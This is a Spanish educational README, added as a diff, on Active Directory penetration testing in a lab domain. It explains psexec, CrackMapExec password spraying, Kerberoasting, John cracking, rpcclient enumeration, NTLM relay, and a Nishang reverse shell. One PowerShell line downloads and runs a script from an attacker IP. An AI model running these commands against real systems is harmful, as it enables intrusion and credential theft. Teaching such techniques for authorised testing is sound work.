@@ -1,0 +1,315 @@
+# 🛡️ Guía de Herramientas de Seguridad en Active Directory: Análisis de Comandos y Técnicas de Auditoría
+
+¡Bienvenido a esta guía completa y atractiva sobre herramientas y comandos utilizados en auditorías de seguridad y pruebas de penetración en entornos Active Directory! Esta README.md está diseñada para ser un recurso educativo, enfocado en el uso ético de estas técnicas. Exploraremos comandos reales de herramientas como Impacket, CrackMapExec, rpcclient y más, con desgloses detallados, usos habituales y notas de seguridad.
+
+Esta guía se basa en análisis de escenarios comunes en hacking ético, como movimiento lateral, enumeración y ataques de identidad. **Recuerda: Solo úsalos en entornos controlados con permiso explícito. El mal uso puede ser ilegal.**
+
+## 📋 Tabla de Contenidos
+- [Psexec.py: Ejecución Remota](#psexecpy-ejecución-remota)
+- [CrackMapExec (CME): Password Spraying](#crackmapexec-cme-password-spraying)
+- [Kerberoasting con GetUserSPNs.py](#kerberoasting-con-getuserspns-py)
+- [John the Ripper: Craqueo de Hashes](#john-the-ripper-craqueo-de-hashes)
+- [Enumeración con rpcclient (Bucle Avanzado)](#enumeración-con-rpcclient-bucle-avanzado)
+- [Enumeración Directa con rpcclient](#enumeración-directa-con-rpcclient)
+- [Sesión Nula con rpcclient](#sesión-nula-con-rpcclient)
+- [Preparación de Reverse Shell con Nishang](#preparación-de-reverse-shell-con-nishang)
+- [Ataque NTLM Relay con Responder y ntlmrelayx.py](#ataque-ntlm-relay-con-responder-y-ntlmrelayxpy)
+- [Lista Completa de Comandos y Funciones](#lista-completa-de-comandos-y-funciones)
+
+---
+
+## 🔧 Psexec.py: Ejecución Remota
+
+El comando en la imagen utiliza la herramienta **psexec.py**, una utilidad de la colección **Impacket** que permite la ejecución remota de comandos en sistemas Windows. Su funcionamiento principal es similar al **PsExec de Microsoft Sysinternals**: te otorga una consola interactiva en una máquina remota a través de la red.
+
+### Desglose del Comando Mostrado
+La estructura general es: `psexec.py [dominio]/[usuario]:[contraseña]@[IP_objetivo] [comando]`.
+
+- `psexec.py`: El script de Python encargado de iniciar la conexión.
+- `s4vicorp.local/Administrador`: Indica que se está intentando conectar al dominio `s4vicorp.local` usando la cuenta del Administrador.
+- **P@\\\$w0rd\\!**: Es la contraseña de la cuenta del administrador. Los símbolos como `\!` suelen llevar barras diagonales inversas (`\`) para que el sistema de comandos no los interprete de forma incorrecta.
+- `192.168.94.138`: Es la dirección IP de la computadora remota a la que se desea acceder.
+- `cmd.exe`: El comando que se ejecutará en la máquina remota, que en este caso abrirá una consola de comandos interactiva.
+
+**Ejemplo de comando completo:**
+```bash
+psexec.py s4vicorp.local/Administrador:P@\\\$w0rd\\!@192.168.94.138 cmd.exe
+```
+
+### ¿Para Qué se Usa Habitualmente?
+- **Administración remota**: Permite a los técnicos gestionar computadoras en una red sin tener que estar físicamente frente a ellas.
+- **Auditorías de seguridad**: Es una herramienta fundamental en pruebas de penetración para demostrar cómo un atacante podría moverse lateralmente dentro de una red si consigue credenciales de administrador.
+
+### Nota de Seguridad ⚠️
+El uso de esta herramienta requiere privilegios de administrador en el equipo de destino, ya que interactúa con recursos compartidos administrativos como `ADMIN$` para funcionar.
+
+**¿Estás intentando configurar una conexión remota en tu red local o te interesa saber cómo proteger tu sistema contra este tipo de herramientas?** Consulta recursos como [Impacket en GitHub](https://github.com/SecureAuthCorp/impacket) o [guías de Spartan Cybersec](https://books.spartan-cybersec.com).
+
+---
+
+## 🔍 CrackMapExec (CME): Password Spraying
+
+Este comando utiliza **CrackMapExec (abreviado como cme)**, una herramienta de post-explotación muy potente diseñada para auditar redes grandes de entornos Active Directory.
+
+### Desglose del Comando
+La estructura es: `cme [protocolo] [objetivo] -u [usuario] -p [contraseña]`.
+
+- `cme smb`: Indica que la herramienta utilizará el protocolo **SMB (Server Message Block)**, que es el que usan los sistemas Windows para compartir archivos e impresoras.
+- `192.168.94.0/24`: Este es el objetivo. No está atacando a una sola máquina, sino a **toda la red** (desde la IP `.1` hasta la `.254`).
+- `-u 'SVC_SQLservice'`: El nombre de usuario que se probará en cada una de las máquinas de esa red.
+- `-p 'MYpassword123#'`: La contraseña que se intentará validar junto con ese usuario.
+
+**Ejemplo de comando completo:**
+```bash
+cme smb 192.168.94.0/24 -u 'SVC_SQLservice' -p 'MYpassword123#'
+```
+
+### ¿Cuál es el Objetivo de este Comando?
+El propósito principal es realizar un **"Password Spraying"** o una validación masiva de credenciales. La herramienta recorrerá toda la red e intentará iniciar sesión en cada dispositivo para ver:
+- En qué máquinas es válida esa combinación de usuario y contraseña.
+- Si ese usuario tiene privilegios de **Administrador Local** (marcado usualmente con un **Pwn3d!** en color amarillo por la herramienta).
+- Información básica del sistema operativo y el nombre de cada computadora.
+
+Es una forma rápida de encontrar dónde tiene acceso una cuenta específica dentro de una infraestructura corporativa.
+
+**¿Estás realizando algún ejercicio de hacking ético o te gustaría saber cómo auditar las contraseñas de tu propia red para mejorar la seguridad?** Revisa [guías en Medium](https://medium.com) o [Spartan Cybersec](https://books.spartan-cybersec.com).
+
+---
+
+## 🔥 Kerberoasting con GetUserSPNs.py
+
+Este comando ejecuta una técnica de ataque en entornos de Active Directory llamada **Kerberoasting**. Utiliza el script **GetUserSPNs.py** de la suite Impacket.
+
+### ¿Qué Está Pasando en la Imagen?
+El objetivo del ataque es obtener un **"hash"** (una versión cifrada de la contraseña) de una cuenta de servicio para luego intentar descifrarla fuera de línea (offline).
+
+- **El comando inicial**: Se conecta al dominio `s4vicorp.local` usando las credenciales del usuario `ramlux`. El parámetro `-request` le pide al controlador de dominio un ticket (**TGS**) para cualquier cuenta que tenga un **SPN (Service Principal Name)** configurado.
+- **La cuenta identificada**: El sistema encuentra la cuenta `svc_sqlservice`. Las cuentas de servicio son objetivos ideales porque suelen tener contraseñas poco robustas y rara vez expiran.
+- **El bloque de texto verde**: Ese es el ticket de Kerberos cifrado. Contiene el hash de la contraseña del usuario `svc_sqlservice`.
+
+**Ejemplo de comando completo:**
+```bash
+GetUserSPNs.py s4vicorp.local/ramlux:password -request
+```
+
+### ¿Para Qué se Hace Esto?
+Un atacante copiaría todo ese bloque verde y lo pasaría por una herramienta como **John the Ripper** o **Hashcat**. Si la contraseña es débil (como en tus ejemplos anteriores), el atacante obtendrá la contraseña en texto plano en cuestión de segundos o minutos.
+
+A diferencia de los comandos anteriores, este es muy **"silencioso"** porque no intenta iniciar sesión en múltiples máquinas; solo le pide al servidor algo que un usuario normal tiene derecho a pedir.
+
+**¿Te interesa ver cómo se usaría Hashcat para intentar romper ese hash que aparece en pantalla?** Sigue leyendo la siguiente sección.
+
+---
+
+## 💥 John the Ripper: Craqueo de Hashes
+
+¡Exacto! Aquí estás completando el proceso que mencionamos antes. Estás usando **John the Ripper** para descifrar el hash que obtuviste mediante Kerberoasting.
+
+### ¿Qué Está Sucediendo en esta Pantalla?
+- `cat hash`: Primero, el usuario muestra el contenido del archivo llamado `hash`, que contiene el ticket de Kerberos de la cuenta `svc_sqlservice` (el bloque de texto que empieza por `$krb5tgs$23$`).
+- **El comando de ataque**:
+  - `john`: Inicia la herramienta de craqueo.
+  - `--wordlist=/usr/share/wordlists/rockyou.txt`: Le indica a John que use el famoso diccionario **"rockyou.txt"**, que contiene millones de contraseñas reales filtradas en internet.
+- **El resultado exitoso**:
+  - John identifica el formato como **Kerberos 5 TGS etype 23**.
+  - En la línea resaltada en verde, aparece: `MYpassword123#`.
+
+**Ejemplo de comando completo:**
+```bash
+john --wordlist=/usr/share/wordlists/rockyou.txt hash
+```
+
+### Conclusión del Ataque
+El ataque ha sido exitoso. Ahora el atacante sabe que la contraseña de la cuenta de servicio `svc_sqlservice` es `MYpassword123#`.
+
+Con esta credencial en texto plano, el siguiente paso lógico sería intentar el comando que me mostraste al principio (`psexec.py`) o el segundo (`cme`) para ver si esta cuenta tiene privilegios de administrador en el controlador de dominio o en otros servidores críticos.
+
+**¿Quieres saber cómo se puede configurar el Active Directory para evitar que este tipo de ataques por diccionario funcionen?** Implementa políticas de contraseñas fuertes y rotación automática.
+
+---
+
+## 📊 Enumeración con rpcclient (Bucle Avanzado)
+
+Este comando es un **bucle avanzado en Bash** que utiliza la herramienta **rpcclient** para realizar una enumeración de usuarios extremadamente detallada en un controlador de dominio Windows.
+
+### ¿Qué Está Haciendo Exactamente?
+El comando se divide en dos fases principales que ocurren automáticamente:
+
+- **Fase de extracción de RIDs**: Primero, usa `rpcclient` con el comando `enumdomusers` para obtener una lista de todos los usuarios del dominio. De esa lista, "limpia" el texto (usando `grep` y `tr`) para quedarse solo con los **RID (Relative Identifiers)**, que son los números únicos finales del SID de cada usuario (como `0x1f4` para el Administrador).
+- **Fase de consulta individual (El bucle for)**: Para cada RID encontrado, ejecuta un segundo comando: `queryuser [RID]`. Esto extrae la información completa de ese usuario específico directamente desde el protocolo **RPC** de Windows.
+
+### Datos que Está Obteniendo en la Imagen
+En la captura puedes ver cómo el script va imprimiendo de forma organizada:
+- **User Name**: El nombre de la cuenta (Administrador, Invitado, krbtgt, mvazquez).
+- **Description**: El comentario o descripción que tiene esa cuenta en el Active Directory.
+- **Para el RID**: El identificador hexadecimal asociado.
+
+**Ejemplo de comando (simplificado):**
+```bash
+for RID in $(rpcclient -U "s4vicorp.local\mvazquez%Password1" 192.168.94.136 -c 'enumdomusers' | grep rid | tr -d 'rid:[]'); do rpcclient -U "s4vicorp.local\mvazquez%Password1" 192.168.94.136 -c "queryuser $RID"; done
+```
+
+### ¿Para Qué Sirve Esto en un Ataque?
+Es una técnica de **reconocimiento**. Un atacante usa esto para:
+- **Identificar objetivos**: Descubrir nombres de usuarios reales para luego intentar ataques de fuerza bruta o password spraying.
+- **Encontrar cuentas olvidadas**: Ver descripciones que puedan revelar información sensible (ej. "Contraseña temporal: Junio2023").
+- **Entender la estructura**: Saber qué usuarios pertenecen a qué servicios o grupos especiales.
+
+Este método es muy efectivo porque, una vez que tienes unas credenciales válidas (como se ve en el comando: `mvazquez:Password1`), puedes extraer la lista completa de todos los demás usuarios del dominio sin levantar muchas alertas.
+
+**¿Te gustaría saber cómo restringir el acceso RPC para que usuarios comunes no puedan listar a todos los demás usuarios del dominio?** Configura políticas de grupo para limitar consultas RPC.
+
+---
+
+## 🔧 Enumeración Directa con rpcclient
+
+Esta imagen muestra la ejecución directa de la herramienta **rpcclient** para listar los usuarios de un dominio de Active Directory. Es, de hecho, el paso previo al comando anterior.
+
+### Desglose del Comando
+- `rpcclient`: Una utilidad de la suite **Samba** para interactuar con puntos finales **RPC (Remote Procedure Call)** de Windows.
+- `-U "s4vicorp.local\mvazquez%Password1"`: Indica las credenciales que se están usando para la conexión. El usuario es `mvazquez` del dominio `s4vicorp.local` y su contraseña es `Password1` (separados por el símbolo `%`).
+- `192.168.94.136`: La dirección IP del controlador de dominio al que se está consultando.
+- `-c 'enumdomusers'`: Es el comando específico que se le envía al servidor para que devuelva la lista de todos los usuarios del dominio.
+
+**Ejemplo de comando completo:**
+```bash
+rpcclient -U "s4vicorp.local\mvazquez%Password1" 192.168.94.136 -c 'enumdomusers'
+```
+
+### ¿Qué Información se Obtiene Aquí?
+El resultado que ves en verde es la lista básica de cuentas:
+- **Nombre del usuario**: Entre corchetes (ej. `[Administrador]`, `[mvazquez]`, `[test]`).
+- **RID (Relative Identifier)**: El identificador único numérico de cada cuenta (ej. `rid:[0x1f4]`).
+
+### Diferencia con el Comando Anterior
+Mientras que el comando anterior (el bucle for) hacía un trabajo extra para obtener las descripciones y detalles de cada persona, este comando es la **fuente de datos original**. Simplemente "tira de la lista" para saber quién existe en la red.
+
+En una auditoría, este es el momento donde el atacante confirma nombres de cuentas reales como `ramlux` o `test` para luego intentar ataques de fuerza bruta contra ellas.
+
+**¿Te gustaría saber cómo identificar si alguien está ejecutando estos comandos en tu red mediante los registros de eventos de Windows?** Monitorea eventos en el Security Log (ID 4624, 4768).
+
+---
+
+## 🚫 Sesión Nula con rpcclient
+
+Esta imagen muestra un intento fallido de enumeración de usuarios utilizando una **sesión nula (null session)** con rpcclient.
+
+### ¿Qué Está Pasando Exactamente?
+- **El comando ejecutado**: `rpcclient -U "" 192.168.94.136 -N`
+  - `-U ""`: Indica que se intenta conectar sin un nombre de usuario.
+  - `-N (No password)`: Le dice a la herramienta que no pida una contraseña.
+- Esto es lo que se conoce como intentar establecer una **Null Session** (una conexión anónima al servidor RPC).
+- **La acción**: Una vez dentro de la consola interactiva de rpcclient, el usuario escribe el comando `enumdomusers`.
+- **El error**: `result was NT_STATUS_ACCESS_DENIED`.
+
+El servidor Windows (la IP `.136`) ha rechazado la solicitud. Esto sucede porque las versiones modernas de Windows (desde **Windows Server 2003** en adelante) tienen deshabilitada por defecto la capacidad de enumerar usuarios de forma anónima.
+
+**Ejemplo de comando completo:**
+```bash
+rpcclient -U "" 192.168.94.136 -N
+```
+
+### ¿Por Qué es Importante este Resultado?
+En el mundo de la ciberseguridad, esto es una **buena noticia** para el administrador del sistema. Significa que el servidor está correctamente configurado y no permite que cualquier persona que se conecte a la red pueda ver la lista de usuarios sin antes haberse identificado con una cuenta válida.
+
+Por eso, en las imágenes anteriores que me mostraste, el usuario tuvo que usar credenciales reales (como `mvazquez%Password1`) para que el comando funcionara. Sin un usuario y contraseña válidos, el servidor bloquea la obtención de información.
+
+**¿Te gustaría saber cómo se puede forzar esta seguridad aún más o cómo se vería un ataque si el servidor estuviera mal configurado y sí permitiera sesiones nulas?** Habilita "Network access: Restrict anonymous access" en políticas de grupo.
+
+---
+
+## 🐚 Preparación de Reverse Shell con Nishang
+
+En esta imagen se está preparando la infraestructura para obtener una **Reverse Shell (consola reversa)** utilizando scripts de la suite **Nishang**, una de las colecciones más famosas para hacking con PowerShell.
+
+### Aquí Tienes el Paso a Paso de lo que Está Ocurriendo
+- **Selección del script**: El usuario está en el directorio `/opt/nishang/Shells` y copia el archivo `Invoke-PowerShellTcp.ps1` a uno más corto llamado `PS.ps1`. Este script es el que se enviará a la víctima para que "llame" de vuelta al atacante.
+- **Edición (nano PS.ps1)**: Probablemente se editó el archivo para añadir al final la línea de ejecución con la IP del atacante y el puerto, de modo que el script se ejecute automáticamente al ser cargado.
+- **Montaje del servidor de descarga**: Ejecuta `python -m SimpleHTTPServer`. Esto convierte la carpeta del atacante en un servidor web temporal. La víctima podrá descargar el script `PS.ps1` entrando a la IP del atacante por el puerto **8000**.
+- **Preparación de la escucha**: En la parte inferior, ejecuta `nc -nlvp 4646`. Esto abre un "oído" (**listener**) con **Netcat** en el puerto **4646**. Aquí es donde llegará la conexión de la víctima una vez que ejecute el script de PowerShell.
+
+**Ejemplos de comandos:**
+```bash
+cp /opt/nishang/Shells/Invoke-PowerShellTcp.ps1 PS.ps1
+nano PS.ps1  # Editar para agregar IP y puerto
+python -m SimpleHTTPServer  # Servidor HTTP en puerto 8000
+nc -nlvp 4646  # Listener en puerto 4646
+```
+
+### ¿Cuál es el Plan Final?
+El atacante hará que la máquina víctima ejecute un comando (usualmente vía `cmd.exe` o `powershell.exe`) que descargue y ejecute ese archivo `PS.ps1` desde el servidor de Python. En el momento en que la víctima lo haga, el atacante recibirá el control total de la consola en la ventana de Netcat.
+
+**¿Te gustaría ver cuál es el comando típico de PowerShell que se usa en la víctima para descargar y ejecutar ese script de una sola vez?** Un ejemplo común: `powershell -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://IP:8000/PS.ps1')"`
+
+---
+
+## ⚡ Ataque NTLM Relay con Responder y ntlmrelayx.py
+
+Esta imagen muestra la combinación perfecta para un ataque de **NTLM Relay**, utilizando dos de las herramientas más potentes para esta técnica: **Responder** y **ntlmrelayx.py**.
+
+### ¿Qué Está Ocurriendo Aquí?
+El objetivo es capturar una autenticación de red de un usuario y, en lugar de intentar descifrar la contraseña, **"retransmitirla" (relay)** en tiempo real hacia otro servidor para ganar acceso.
+
+- **Ventana superior (Responder.py)**:
+  - **Comando**: `python3 Responder.py -I eth0 -rdw`
+  - **Función**: Responder se pone a la escucha en la interfaz `eth0`. Su trabajo es **"envenenar"** las peticiones de red (**LLMNR**, **NBT-NS** y **MDNS**). Cuando una computadora en la red busca un recurso que no existe (ej. escribe mal el nombre de un servidor), Responder le dice: "Yo soy ese servidor, dame tus credenciales para dejarte entrar".
+  - **Configuración**: Los parámetros `-rdw` suelen usarse para desactivar los servidores internos de Responder (como SMB o HTTP) para que el tráfico pueda ser capturado y enviado a la siguiente herramienta.
+
+- **Ventana inferior (ntlmrelayx.py)**:
+  - **Comando**: `ntlmrelayx.py -tf targets.txt -smb2support`
+  - **Función**: Esta herramienta de la suite Impacket recibe la autenticación que Responder capturó y la intenta usar contra los servidores listados en el archivo `targets.txt`.
+  - **Resultado**: Si el usuario que cayó en el engaño tiene permisos de administrador en alguna de las máquinas de `targets.txt`, ntlmrelayx.py ejecutará comandos o extraerá la base de datos de contraseñas (**SAM**) automáticamente.
+
+**Ejemplos de comandos completos:**
+```bash
+python3 Responder.py -I eth0 -rdw
+ntlmrelayx.py -tf targets.txt -smb2support
+```
+
+### ¿Por Qué es un Ataque tan Peligroso?
+Es extremadamente efectivo porque no necesita romper la contraseña. El atacante simplemente usa la **"identidad"** de la víctima mientras esta intenta conectar con un recurso de red. Si el servidor objetivo no tiene activado el **SMB Signing (firmado de SMB)**, el ataque tendrá éxito.
+
+**¿Te gustaría saber cómo verificar si tus servidores tienen activado el SMB Signing para protegerte de este ataque?** Usa `Get-SmbServerConfiguration` en PowerShell y habilita `RequireSecuritySignature`.
+
+---
+
+## 📝 Lista Completa de Comandos y Funciones
+
+Aquí tienes la lista completa de todos los comandos que hemos analizado en las imágenes, organizados por su función en una auditoría de seguridad:
+
+1. **Ejecución Remota y Movimiento Lateral**
+   - `psexec.py s4vicorp.local/Administrador:Contraseña@IP cmd.exe`
+   - **Función**: Obtiene una consola interactiva (`cmd.exe`) en una máquina remota de forma legítima usando credenciales de administrador. Es útil para gestionar equipos o moverse de una máquina a otra en la red.
+
+2. **Reconocimiento y Enumeración de Red**
+   - `cme smb 192.168.94.0/24 -u 'Usuario' -p 'Contraseña'`
+   - **Función**: Escanea toda una red (rango `/24`) buscando equipos donde esas credenciales sean válidas. Indica si el usuario tiene privilegios de administrador local.
+   - `rpcclient -U "dominio\usuario%password" IP -c 'enumdomusers'`
+   - **Función**: Se conecta al servicio RPC de un servidor Windows para extraer la lista completa de todos los usuarios creados en el dominio.
+   - `rpcclient -U "" IP -N`
+   - **Función**: Intenta una "sesión nula" (sin usuario ni contraseña) para ver si el servidor permite listar información de forma anónima (generalmente falla en sistemas modernos).
+
+3. **Ataques de Identidad (Active Directory)**
+   - `GetUserSPNs.py s4vicorp.local/usuario:password -request`
+   - **Función**: Ejecuta la técnica de Kerberoasting. Solicita tickets de servicio (TGS) para cuentas que tengan un SPN configurado, con el fin de obtener sus hashes de contraseña.
+   - `python3 Responder.py -I eth0 -rdw`
+   - **Función**: Envenena peticiones de red para engañar a otras computadoras y hacer que envíen sus hashes de autenticación al atacante.
+   - `ntlmrelayx.py -tf targets.txt -smb2support`
+   - **Función**: Toma los hashes capturados (por Responder u otros) y los retransmite en tiempo real a una lista de objetivos (`targets.txt`) para ganar acceso sin conocer la contraseña.
+
+4. **Craqueo de Contraseñas**
+   - `john --wordlist=/ruta/diccionario hash`
+   - **Función**: Intenta descifrar un hash obtenido previamente comparándolo contra millones de palabras de un diccionario (como el archivo `rockyou.txt`).
+
+5. **Preparación de Shells e Infraestructura**
+   - `python -m SimpleHTTPServer`
+   - **Función**: Crea un servidor web instantáneo para que una máquina víctima pueda descargar archivos (como scripts de ataque) desde la computadora del atacante.
+   - `nc -nlvp 4646`
+   - **Función**: Abre un puerto (`4646`) a la escucha para recibir una conexión entrante (Reverse Shell) desde una computadora comprometida.
+
+## 🚀 Contribuciones y Recursos Adicionales
+- **Repositorios clave**: [Impacket en GitHub](https://github.com/SecureAuthCorp/impacket), [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec), [Responder](https://github.com/lgandx/Responder).
+- **Lecturas recomendadas**: Artículos en [Medium](https://medium.com) y [Spartan Cybersec](https://books.spartan-cybersec.com).
+- Si tienes sugerencias para mejorar esta guía, ¡abre un issue o pull request!
+
+**¡Mantén la ciberseguridad ética y protege tus sistemas! 🔒**
